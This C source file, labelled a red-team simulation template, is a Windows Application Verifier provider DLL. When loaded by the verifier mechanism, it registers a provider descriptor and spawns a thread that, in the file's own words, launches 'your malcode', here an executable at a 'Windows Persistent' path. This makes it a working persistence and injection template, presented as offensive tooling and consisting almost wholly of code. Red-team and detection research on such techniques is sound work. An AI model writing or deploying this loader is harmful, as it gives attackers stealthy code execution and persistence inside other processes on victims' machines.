/*

 Red Team Simulation template
 DLL proxy template
 
 Author: Shaikh Jamal Uddin (Linkedin: https://www.linkedin.com/in/engrjamal/)
*/
#include <Windows.h>

// https://docs.microsoft.com/en-us/archive/blogs/reiley/a-debugging-approach-to-application-verifier
#define DLL_PROCESS_VERIFIER 4

typedef VOID (NTAPI * RTL_VERIFIER_DLL_LOAD_CALLBACK) (PWSTR DllName, PVOID DllBase, SIZE_T DllSize, PVOID Reserved);
typedef VOID (NTAPI * RTL_VERIFIER_DLL_UNLOAD_CALLBACK) (PWSTR DllName, PVOID DllBase, SIZE_T DllSize, PVOID Reserved);
typedef VOID (NTAPI * RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK) (PVOID AllocationBase, SIZE_T AllocationSize);

typedef struct _RTL_VERIFIER_THUNK_DESCRIPTOR {
  PCHAR ThunkName;
  PVOID ThunkOldAddress;
  PVOID ThunkNewAddress;
} RTL_VERIFIER_THUNK_DESCRIPTOR, *PRTL_VERIFIER_THUNK_DESCRIPTOR;

typedef struct _RTL_VERIFIER_DLL_DESCRIPTOR {
  PWCHAR DllName;
  DWORD DllFlags;
  PVOID DllAddress;
  PRTL_VERIFIER_THUNK_DESCRIPTOR DllThunks;
} RTL_VERIFIER_DLL_DESCRIPTOR, *PRTL_VERIFIER_DLL_DESCRIPTOR;

typedef struct _RTL_VERIFIER_PROVIDER_DESCRIPTOR {
  DWORD Length;
  PRTL_VERIFIER_DLL_DESCRIPTOR ProviderDlls;
  RTL_VERIFIER_DLL_LOAD_CALLBACK ProviderDllLoadCallback;
  RTL_VERIFIER_DLL_UNLOAD_CALLBACK ProviderDllUnloadCallback;
  PWSTR VerifierImage;
  DWORD VerifierFlags;
  DWORD VerifierDebug;
  PVOID RtlpGetStackTraceAddress;
  PVOID RtlpDebugPageHeapCreate;
  PVOID RtlpDebugPageHeapDestroy;
  RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK ProviderNtdllHeapFreeCallback;
} RTL_VERIFIER_PROVIDER_DESCRIPTOR, *PRTL_VERIFIER_PROVIDER_DESCRIPTOR;

static RTL_VERIFIER_DLL_DESCRIPTOR atDLLs[] = { { 0 } };
static RTL_VERIFIER_PROVIDER_DESCRIPTOR tVpd = { sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR), atDLLs };

void Go(void) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

	CreateProcess(
				"c:\\Windows Persistent\\Embed\\embed.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);

}

BOOL ProcessVerifier(IN PVOID lpReserved)
{
	*((PRTL_VERIFIER_PROVIDER_DESCRIPTOR *)lpReserved) = &tVpd;

	// launch your malcode in a separate thread
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0);

	return TRUE;
}


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
	case DLL_PROCESS_VERIFIER:
		return ProcessVerifier(lpReserved);
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


